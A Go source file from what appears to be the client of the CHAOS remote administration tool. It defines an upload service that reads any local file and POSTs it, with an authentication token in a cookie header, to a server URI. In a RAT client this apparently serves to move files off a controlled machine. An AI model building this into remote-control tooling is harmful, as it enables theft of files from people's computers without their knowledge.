package upload

import (
	"bytes"
	"fmt"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
)

type UploadService struct {
	Configuration *environment.Configuration
	HttpClient    *http.Client
}

func NewUploadService(configuration *environment.Configuration, httpClient *http.Client) services.Upload {
	return &UploadService{
		Configuration: configuration,
		HttpClient:    httpClient,
	}
}

func (u UploadService) UploadFile(path string, uri string, paramName string) ([]byte, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	fileBytes, err := ioutil.ReadAll(file)
	if err != nil {
		return nil, err
	}
	fi, err := file.Stat()
	if err != nil {
		return nil, err
	}
	file.Close()

	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile(paramName, fi.Name())
	if err != nil {
		return nil, err
	}
	part.Write(fileBytes)

	err = writer.Close()
	if err != nil {
		return nil, err
	}

	request, err := http.NewRequest(http.MethodPost, uri, body)
	request.Header.Set(u.Configuration.Connection.CookieHeader, u.Configuration.Connection.Token)
	request.Header.Set(u.Configuration.Connection.ContentTypeHeader, writer.FormDataContentType())
	if err != nil {
		return nil, err
	}

	res, err := u.HttpClient.Do(request)
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("request failed with status code: %d", res.StatusCode)
	}
	return ioutil.ReadAll(res.Body)
}
